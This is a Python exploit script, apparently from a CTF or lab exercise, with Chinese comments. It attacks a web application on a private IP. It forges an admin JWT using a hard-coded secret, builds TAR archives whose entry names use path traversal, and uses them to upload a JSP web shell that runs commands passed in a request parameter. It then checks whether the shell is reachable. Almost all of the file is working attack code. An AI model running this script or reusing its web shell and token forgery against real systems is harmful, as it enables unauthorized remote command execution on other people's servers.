#!/usr/bin/env python3
"""
尝试不同的TAR文件名格式
"""

import jwt
import requests
import tarfile
import io

TARGET = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

# 创建 admin token  
payload = {"sub": "admin", "role": "admin"}
admin_token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")

jsp_code = b"""<%@ page import="java.io.*" %><%Process p=Runtime.getRuntime().exec(request.getParameter("c"));InputStream is=p.getInputStream();int b;while((b=is.read())!=-1)out.write((char)b);%>"""

# 尝试多种路径格式
test_paths = [
    ("/../rce1.jsp", "绝对路径遍历"),
    ("/rce2.jsp", "绝对路径"),
    ("../rce3.jsp", "相对路径"),
    ("../../rce4.jsp", "两级相对路径"),
    ("./rce5.jsp", "当前目录"),
]

for i, (path, desc) in enumerate(test_paths, 1):
    print(f"\n[*] 测试 #{i}: {desc}")
    print(f"    路径: {path}")
    
    # 创建TAR
    tar_buffer = io.BytesIO()
    tar = tarfile.open(fileobj=tar_buffer, mode='w')
    
    info = tarfile.TarInfo(name=path)
    info.size = len(jsp_code)
    tar.addfile(tarinfo=info, fileobj=io.BytesIO(jsp_code))
    
    tar.close()
    tar_data = tar_buffer.getvalue()
    
    # 上传
    try:
        files = {'file': (f'test{i}.tar', tar_data, 'application/x-tar')}
        r = requests.post(
            f"{TARGET}/admin/upload",
            headers={"Cookie": f"token={admin_token}"},
            files=files,
            timeout=10
        )
        print(f"    上传: {r.status_code} - {r.text[:150]}")
        
        # 如果成功，测试访问
        if "ok" in r.text:
            filename = path.split('/')[-1]
            test_urls = [
                f"/{filename}",
                f"/uploads/{filename}",
            ]
            
            for url in test_urls:
                try:
                    r2 = requests.get(f"{TARGET}{url}", timeout=3)
                    if r2.status_code == 200:
                        print(f"      [+] 可访问: {url}")
                        if "<%@" not in r2.text:
                            print(f"        [+] 可能可执行!")
                except:
                    pass
    except Exception as e:
        print(f"    Error: {e}")

print("\n\n[*] 总结: uploads目录后面没有'/'导致路径拼接错误")
print("[*] 根据错误信息: uploads../rce.jsp 变成 uploads../rce.jsp")
print("[*] 需要找到在uploads后添加'/'的方法，或利用其他漏洞")
